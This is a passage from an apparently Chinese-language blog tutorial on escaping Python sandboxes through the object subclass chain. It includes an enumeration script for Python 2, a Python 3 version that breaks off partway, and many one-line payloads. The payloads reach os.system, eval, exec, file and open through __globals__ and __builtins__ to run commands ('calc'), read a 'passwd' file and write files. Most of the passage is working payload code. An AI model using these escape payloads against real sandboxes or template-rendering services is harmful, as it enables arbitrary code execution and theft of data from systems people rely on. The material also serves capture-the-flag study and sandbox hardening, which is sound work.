class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'genericpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'stat'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'__phello__.foo'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sched'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'statvfs'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'trace'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'warnings'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'symbol'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sets'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'htmlentitydefs'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'urllib2'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'SimpleXMLRPCServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sunaudio'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pdb.doc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'asynchat'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'user'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'xmllib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'codeop'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-next3'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'types'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'argparse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'uuid'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-aix4'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-aix3'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'ssl'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'poplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'xmlrpclib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'difflib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'urlparse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'linecache'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_strptime'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'htmllib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'site-packages'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'posixpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'stringold'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'gzip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'mhlib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'rlcompleter'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'hmac'</span>: [<span class="string">'__builtins__'</span>]&#125;</span><br><span class="line">target_modules = [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'timeit'</span>, <span class="string">'importlib'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>]</span><br><span class="line">target_functions = [<span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'exec'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>]</span><br><span class="line">all_targets = list(set(find_modules.keys() + target_modules + target_functions))</span><br><span class="line">all_modules = list(set(find_modules.keys() + target_modules))</span><br><span class="line">subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</span><br><span class="line"><span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()</span></span><br><span class="line">print(<span class="string">'----------1-----------'</span>)</span><br><span class="line"><span class="keyword">for</span> i, s <span class="keyword">in</span> enumerate(sub_name):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">        <span class="keyword">if</span> f == s:</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                print(i, f)</span><br><span class="line">            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                target = find_modules[f]</span><br><span class="line">                sub_dict = subclasses[i].__dict__</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                        print(i, f, target)</span><br><span class="line">print(<span class="string">'----------2-----------'</span>)</span><br><span class="line"><span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub.__init__.func_globals</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> m <span class="keyword">in</span> more:</span><br><span class="line">                print(i, sub, m, find_modules.get(m))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">print(<span class="string">'----------3-----------'</span>)</span><br><span class="line"><span class="comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").system("ls")')</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub.__init__.func_globals.values()</span><br><span class="line">        <span class="keyword">for</span> j, v <span class="keyword">in</span> enumerate(more):</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> f <span class="keyword">in</span> v:</span><br><span class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                            print(i, j, sub, f)</span><br><span class="line">                        <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                            target = find_modules.get(f)</span><br><span class="line">                            sub_dict = v[f].__dict__</span><br><span class="line">                            <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                                <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                                    print(i, j, sub, f, target)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">print(<span class="string">'----------4-----------'</span>)</span><br><span class="line"><span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")</span></span><br><span class="line"><span class="comment"># &lt;class 'warnings.catch_warnings'&gt;类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub()._module.__builtins__</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> more:</span><br><span class="line">                print(i, f)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>下面简单归纳下遍历的4种方式：</p>
<p><strong>第一种方式</strong>   </p>
<p>序号为40，即file()函数，进行文件读取和写入，payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'E:/passwd'</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'E:/test.txt'</span>, <span class="string">'w'</span>).write(<span class="string">'xxx'</span>)</span><br></pre></td></tr></table></figure>

<p>这和前面元素链构造时给出的Demo有点区别： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'E:/passwd'</span>).read()</span><br></pre></td></tr></table></figure>
<p>序号59是WarningMessage类，其具有globals属性，包含builtins，其中含有file()函数，属于第二种方式；而这里是直接在object类的所有子类中直接找到了file()函数的序号为40，直接调用即可。<br><strong>第二种方式</strong></p>
<p>先看序号为59的WarningMessage类有哪些而利用的模块或方法：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(59, &lt;class 'warnings.WarningMessage'&gt;, 'linecache', ['os', 'sys', '__builtins__'])</span><br><span class="line">(59, &lt;class 'warnings.WarningMessage'&gt;, '__builtins__', None)</span><br><span class="line">(59, &lt;class 'warnings.WarningMessage'&gt;, 'sys', None)</span><br><span class="line">(59, &lt;class 'warnings.WarningMessage'&gt;, 'types', ['__builtins__'])</span><br></pre></td></tr></table></figure>
<p>以linecache中的os为例，这里简单解释下工具的寻找过程依次如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 确认linecache</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>]</span><br><span class="line"><span class="comment"># 返回linecache字典中的所有键</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__</span><br><span class="line">.keys()</span><br><span class="line"><span class="comment"># 在linecache字典的所有键中寻找os的序号，找到为12</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__</span><br><span class="line">.keys().index(<span class="string">'os'</span>)</span><br><span class="line"><span class="comment"># 更换keys()为values()，访问12序号的元素，并获取该os字典的所有键</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__.values()[<span class="number">12</span>].__dict__.keys()</span><br><span class="line"><span class="comment"># 在os字典的所有键中寻找system的序号，找到为79</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__.values()[<span class="number">12</span>].__dict__.keys().index(<span class="string">'system'</span>)</span><br><span class="line"><span class="comment"># 执行os.system()</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__.values()[<span class="number">12</span>].__dict__.values()[<span class="number">79</span>](<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure>
<p>payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># linecache利用</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__[<span class="string">'os'</span>].system(<span class="string">'calc'</span>)</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__[<span class="string">'sys'</span>].modules[<span class="string">'os'</span>].system(<span class="string">'calc'</span>)</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __builtins__利用，包括__import__、file、open、execfile、eval、结合exec的compile等</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'E:/passwd'</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'open'</span>](<span class="string">'E:/test.txt'</span>, <span class="string">'w'</span>).write(<span class="string">'hello'</span>)</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'execfile'</span>](<span class="string">'E:/exp.py'</span>)</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("calc")'</span>)</span><br><span class="line">exec(<span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'compile'</span>](<span class="string">'__import__("os").system("calc")'</span>, <span class="string">'&lt;string&gt;'</span>, <span class="string">'exec'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># sys利用</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'sys'</span>].modules[<span class="string">'os'</span>].system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># types利用，后面还是通过__builtins__实现利用</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'types'</span>].__dict__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure>
<p>序号为60的catch_warnings类利用payload同上。</p>
<p>序号为61、62的两个类均只有<code>__builtins__</code>可利用，利用payload同上。</p>
<p>序号为72、77的两个类_Printer和Quitter，相比前面的，没见过的有os和traceback，但只有os模块可利用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os利用</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">72</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure>
<p>序号为78、79的两个类IncrementalEncoder和IncrementalDecoder，相比前面的，没见过的有open：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># open利用</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[78].__init__.__globals__[&#39;open&#39;](&#39;E:&#x2F;passwd&#39;).read()</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[78].__init__.__globals__[&#39;open&#39;](&#39;E:&#x2F;test.txt&#39;, &#39;w&#39;).write()</span><br></pre></td></tr></table></figure>
<p><strong>第三种方式</strong><br>先看下序号为59的WarningMessage类：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(59, 13, &lt;class 'warnings.WarningMessage'&gt;, '__import__')</span><br><span class="line">(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'file')</span><br><span class="line">(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'compile')</span><br><span class="line">(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'eval')</span><br><span class="line">(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'open')</span><br><span class="line">(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'execfile')</span><br></pre></td></tr></table></figure>
<p>注意是通过values()函数中的数组序号来填写第二个数值实现调用，以下以eval为示例，其他的利用payload和前面的差不多就不再赘述了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#39;)</span><br></pre></td></tr></table></figure>
<p>其他类似修改即可。</p>
<p><strong>第四种方式</strong></p>
<p>这里只有一种序号，为60：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">60</span>, <span class="string">'__import__'</span>)</span><br><span class="line">(<span class="number">60</span>, <span class="string">'file'</span>)</span><br><span class="line">(<span class="number">60</span>, <span class="string">'repr'</span>)</span><br><span class="line">(<span class="number">60</span>, <span class="string">'compile'</span>)</span><br><span class="line">(<span class="number">60</span>, <span class="string">'eval'</span>)</span><br><span class="line">(<span class="number">60</span>, <span class="string">'open'</span>)</span><br><span class="line">(<span class="number">60</span>, <span class="string">'execfile'</span>)</span><br></pre></td></tr></table></figure>
<p>调用示例如下，其他类似修改即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">60</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"calc"</span>)</span><br></pre></td></tr></table></figure>


<p>python3</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">find_modules = &#123;<span class="string">'asyncio'</span>: [<span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'collections'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'concurrent'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ctypes'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'curses'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'dbm'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'distutils'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'email'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'encodings'</span>: [<span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'ensurepip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'html'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'http'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'idlelib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'importlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'json'</span>: [<span class="string">'codecs'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lib2to3'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'logging'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'msilib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'multiprocessing'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pydoc_data'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sqlite3'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'test'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'tkinter'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'turtledemo'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'unittest'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'urllib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'venv'</span>: [<span class="string">'os'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'wsgiref'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'xml'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'xmlrpc'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'__future__'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'__phello__.foo'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_bootlocale'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_collections_abc'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_compat_pickle'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_compression'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_dummy_thread'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_markupbase'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_osx_support'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_pydecimal'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_pyio'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'_sitebuiltins'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_strptime'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_threading_local'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_weakrefset'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'abc'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'aifc'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'antigravity'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'argparse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ast'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'asynchat'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'asyncore'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'base64'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'bdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'binhex'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'bisect'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'bz2'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'cProfile'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'calendar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'cgi'</span>: [<span class="string">'os'</span>, <span 